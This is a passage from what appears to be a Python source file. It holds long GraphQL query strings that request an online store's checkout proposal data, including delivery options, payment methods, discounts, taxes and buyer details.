phone __typename}... on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}... on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{... on IdealPaymentMethodParameters{bank __typename}__typename}__typename}... on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}... on OffsitePaymentMethod{paymentMethodIdentifier name __typename}... on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}... on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}... on ManualPaymentMethod{id name paymentMethodIdentifier __typename}... on DeferredPaymentMethod{orderingIndex displayName __typename}... on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}... on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}... on NoopPaymentMethod{__typename}__typename}__typename}

"""

QUERY_PROPOSAL_DELIVERY = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{... on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}... on CheckpointDenied{redirectUrl __typename}... on Throttled{pollAfter queueToken pollUrl __typename}... on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}... on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml... on RemoveTermViolation{target __typename}... on AcceptNewTermViolation{target __typename}... on ConfirmChangeViolation{from to __typename}... on UnprocessableTermViolation{target __typename}... on UnresolvableTermViolation{target __typename}... on ApplyChangeViolation{target from{... on ApplyChangeValueInt{value __typename}... on ApplyChangeValueRemoval{value __typename}... on ApplyChangeValueString{value __typename}__typename}to{... on ApplyChangeValueInt{value __typename}... on ApplyChangeValueRemoval{value __typename}... on ApplyChangeValueString{value __typename}__typename}__typename}... on GenericError{__typename}... on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{... on FilledBuyerIdentityTerms{email phone customer{... on CustomerProfile{email __typename}... on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{... on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails... on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{... on RetailAttributions{deviceId locationId userId __typename}... on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{... on SaleAttribution{recipient{... on StaffMember{id __typename}... on Location{id __typename}... on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment... on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename... on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}... on PendingTerms{pollDelay taskId __typename}... on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{... on DiscountAllocatedAllocationSet{__typename allocations{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{... on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{... on PercentageValue{percentage __typename}... on FixedAmountValue{appliesOnEachItem fixedAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}... on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{... on PercentageValue{percentage __typename}... on FixedAmountValue{appliesOnEachItem fixedAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}... on DiscountCodeTrigger{code __typename}... on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{... on PercentageValue{percentage __typename}... on FixedAmountValue{appliesOnEachItem fixedAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename... on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{... on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}... on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{... on CompleteDeliveryStrategy{handle __typename}... on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{... on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{... on IntIntervalConstraint{lowerBound upperBound __typename}... on IntValueConstraint{value __typename}__typename}amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{... on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}... on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}... on PendingTerms{pollDelay taskId __typename}... on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{... on MerchandiseLine{stableId quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}... on MerchandiseBundleLineComponent{stableId quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}... on MerchandiseLineComponentWithCapabilities{stableId quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{... on SourceProvidedMerchandise{__typename requiresShipping}... on ProductVariantMerchandise{__typename requiresShipping}... on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}... on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{... on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{... on MerchandisePropertyValueString{string:value __typename}... on MerchandisePropertyValueInt{int:value __typename}... on MerchandisePropertyValueFloat{float:value __typename}... on MerchandisePropertyValueBoolean{boolean:value __typename}... on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{... on LineComponentDiscountAllocation{allocation{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails... on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails... on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{... on PendingTerms{taskId pollDelay __typename}... on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{... on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{... on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}... on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{... on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{... on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{... on IntIntervalConstraint{lowerBound upperBound __typename}... on IntValueConstraint{value __typename}__typename}amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{... on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}... on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}... on PendingTerms{pollDelay taskId __typename}... on UnavailableTerms{__typename}__typename}payment{... on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{... on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}... on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}... on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}... on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename... on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}... on WalletsPlatformConfiguration{name configurationParams __typename}... on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}... on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}... on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}... on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}... on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}... on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}... on AmazonPayClassicWalletConfig{__typename name orderingIndex}... on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{... on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}... on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}... on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}... on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}... on DeferredPaymentMethod{orderingIndex displayName __typename}... on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}... on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{... on DepositPercentage{percentage __typename}__typename}__typename}... on PendingTerms{pollDelay __typename}... on UnavailableTerms{__typename}__typename}poNumber merchandise{... on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails... on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{... on FilledBuyerIdentityTerms{customer{... on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}... on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}... on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{... on SMSMarketingConsent{value __typename}... on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{... on FilledDutyTerms{totalDutyAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}... on PendingTerms{pollDelay __typename}... on UnavailableTerms{__typename}__typename}tax{... on FilledTaxTerms{totalTaxAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{... on TargetAllLines{__typename}__typename}__typename}__typename}... on PendingTerms{pollDelay __typename}... on UnavailableTerms{__typename}__typename}tip{tipSuggestions{... on TipSuggestion{__typename percentage amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{... on FilledTipTerms{tipLines{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{... on LocalizationExtension{fields{... on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{... on RetailAttributions{deviceId locationId userId __typename}... on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{... on SaleAttribution{recipient{... on StaffMember{id __typename}... on Location{id __typename}... on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment... on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{... on Captcha{provider challenge sitekey token __typename}... on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{... on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{... on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename... on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}... on PendingTerms{pollDelay taskId __typename}... on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{... on ShopCashRedemptionContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}... on StoreCreditRedemptionContent{storeCreditAccountId __typename}... on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{... on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{... on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{... on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{... on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}... on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}... on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}... on WalletsPlatformPaymentMethod{name walletParams __typename}... on WalletPaymentMethod{name walletContent{... on ShopPayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}... on PaypalWalletContent{paypalBillingAddress:billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}... on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData 